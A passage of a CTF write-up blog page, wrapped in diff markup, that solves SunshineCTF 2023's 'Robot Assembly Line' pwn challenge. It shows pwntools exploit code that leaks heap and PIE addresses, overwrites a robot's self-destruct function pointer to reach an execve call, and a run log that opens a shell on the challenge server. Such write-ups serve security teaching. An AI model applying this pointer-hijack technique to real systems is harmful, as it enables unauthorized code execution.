+    <span class="n">PIELEAK</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">":"</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">).</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
+    <span class="n">e</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">PIELEAK</span> <span class="o">-</span> <span class="mh">0x19c0</span>
+
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"PIE leak        : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">PIELEAK</span><span class="p">))</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"ELF             : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">address</span><span class="p">))</span>    </code></pre></figure>
+
+<p>This will now again overwrite the <code class="language-plaintext highlighter-rouge">robot</code> pointer in the next <code class="language-plaintext highlighter-rouge">timer</code> object and lets it point to the <code class="language-plaintext highlighter-rouge">robot_self_destruct</code> function pointer in the timer object. With this we can leak and calculate the base address of the binary.</p>
+
+<p>We could also have leaked a <code class="language-plaintext highlighter-rouge">libc</code> address from the <code class="language-plaintext highlighter-rouge">pthread</code> object in the heap this way and call <code class="language-plaintext highlighter-rouge">system("/bin/sh")</code>, but the binary also contains a <code class="language-plaintext highlighter-rouge">wat</code> function, which we can use to solve it completely without relying on <code class="language-plaintext highlighter-rouge">libc</code> at all.</p>
+
+<figure class="highlight"><pre><code class="language-asm" data-lang="asm">.text:0000000000001E22 wat
+.text:0000000000001E22   endbr64
+.text:0000000000001E26   push    rbp
+.text:0000000000001E27   mov     rbp, rsp
+.text:0000000000001E2A   call    _rand
+.text:0000000000001E2F   test    eax, eax
+.text:0000000000001E31   jns     short loc_1E47
+.text:0000000000001E33   mov     edx, (offset dword_0+3) ; envp
+.text:0000000000001E38   mov     esi, (offset dword_0+2) ; argv
+.text:0000000000001E3D   mov     edi, (offset dword_0+1) ; path
+.text:0000000000001E42   call    _execve
+.text:0000000000001E47
+.text:0000000000001E47 loc_1E47:
+.text:0000000000001E47   nop
+.text:0000000000001E48   pop     rbp
+.text:0000000000001E49   retn
+.text:0000000000001E49 wat             endp</code></pre></figure>
+
+<p>Though calling <code class="language-plaintext highlighter-rouge">wat</code> itself, would call <code class="language-plaintext highlighter-rouge">rand</code> and then just return, since the result will probably never be <code class="language-plaintext highlighter-rouge">0</code>. Also jumping anywhere before <code class="language-plaintext highlighter-rouge">0x1E42</code> would fill the parameters with junk making <code class="language-plaintext highlighter-rouge">execve</code> fail.</p>
+
+<p>Since the <code class="language-plaintext highlighter-rouge">robot_self_destruct</code> function will be called with its first argument pointing to our <code class="language-plaintext highlighter-rouge">robot</code> object itself, we luckily don’t need anything else than the <code class="language-plaintext highlighter-rouge">execve</code> call, so we can just overwrite <code class="language-plaintext highlighter-rouge">robot_self_destruct</code> with <code class="language-plaintext highlighter-rouge">elfbase + 0x1e42</code>, which will then call <code class="language-plaintext highlighter-rouge">execve(botname, 0, 0)</code>.</p>
+
+<p>Just put a <code class="language-plaintext highlighter-rouge">/bin/sh</code> into the name of a bot and overwrite the <code class="language-plaintext highlighter-rouge">robot</code> pointer in the next <code class="language-plaintext highlighter-rouge">timer</code> object with it and overwrite <code class="language-plaintext highlighter-rouge">robot_self_destruct</code> with <code class="language-plaintext highlighter-rouge">elfbase + 0x1e42</code> and then just… wait…</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mh">0xffffffffffffffff</span><span class="o">/</span><span class="mh">0x30</span><span class="p">))</span>
+
+    <span class="n">setrobot</span><span class="p">(</span><span class="s">"/bin/sh</span><span class="se">\x00\n</span><span class="s">"</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="bp">True</span><span class="p">,</span> <span class="bp">True</span><span class="p">,</span> <span class="mi">40</span><span class="o">*</span><span class="mi">1000</span><span class="o">*</span><span class="mi">1000</span><span class="p">)</span>
+ 
+    <span class="p">...</span>
+    <span class="p">...</span>
+
+    <span class="n">finish_bot_input</span><span class="p">()</span>
+
+    <span class="c1"># partial overwrite bot function to execute execve(botname)
+</span>    <span class="n">WATTARGET</span> <span class="o">=</span> <span class="n">e</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x1e42</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"WAT target      : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">WATTARGET</span><span class="p">))</span>
+
+    <span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">HEAPLEAK</span> <span class="o">-</span> <span class="mh">0x100</span><span class="p">)</span> <span class="o">+</span> <span class="n">p16</span><span class="p">(</span><span class="n">WATTARGET</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span>
+    
+    <span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Wait for bot to die to trigger shell"</span><span class="p">)</span>
+    <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[*] '/media/sf_ctf/sunshine23/ral/robots-assemble'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[*] '/media/sf_ctf/sunshine23/ral/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Opening connection to chal.2023.sunshinectf.games on port 23000: Done
+[*] HEAP leak       : 0x56070889d4c0
+[*] PIE leak        : 0x5607073239c0
+[*] ELF             : 0x560707322000
+[*] WAT target      : 0x560707323e42
+[*] Wait for bot to die to trigger shell
+[*] Switching to interactive mode
+IQ for robot ��\x8\x07?
+$ ls
+flag.txt
+$ cat flag.txt
+sun{t4rg3t_l0s7_4r3_y0u_st1ll_th3r3?}</code></pre></figure>
+
+
+
+    <aside class="share">
+
+      <span>Share this: </span>
+
+      <a href="http://twitter.com/share?text=SunshineCTF 2023 - Robot Assembly Line&amp;url=https://kileak.github.io/ctf/2023/sunshine23-ral/"
+      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <i class="icon icon-twitter-rounded"></i>
+      </a>
+
+      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2023/sunshine23-ral/"
+      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <i class="icon icon-facebook-rounded"></i>
+      </a>
+
+    </aside>
+  </div>
+
+  
+  <hr>
+  <aside id="comments" class="disqus">
+    <div class="container">
+      <h3><i class="icon icon-comments-o"></i> Comments</h3>
+      <div id="disqus_thread"></div>
+
+      <script type="text/javascript">
+        var disqus_shortname = 'kileak';
+        var disqus_identifier = '/ctf/2023/sunshine23-ral';
+        var disqus_title = 'SunshineCTF 2023 - Robot Assembly Line';
+        var disqus_url = 'https://kileak.github.io/ctf/2023/sunshine23-ral';
+
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+      </script>
+
+      <noscript>
+        Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
+      </noscript>
+    </div>
+  </aside>
+
+
+
+</article>
+
+        </section>
+
+        
+<div class="clearfix"></div>
+
+<footer class="site-footer txt-center">
+  <hr>
+
+  <ul class="social">
+    
+  </ul>
+
+  <small>&copy; 2025 All rights reserved. Made with <a href="http://jekyllrb.com" target="_blank">Jekyll</a> and <i class="icon icon-heart"></i></small>
+  <small>by <a href="http://nandomoreira.me" target="_blank">nandomoreira.me</a></small>
+
+</footer>
+
+
+    </main>
+
+    <a href="http://github.com/Kileak" target="_blank" class="github-corner"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#000; color:#fff; position: absolute; top: 0; border: 0; right: 0;"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jekyll-search.min.js"></script>
+    <script src="/js/main.js"></script>
+  </body>
+</html>
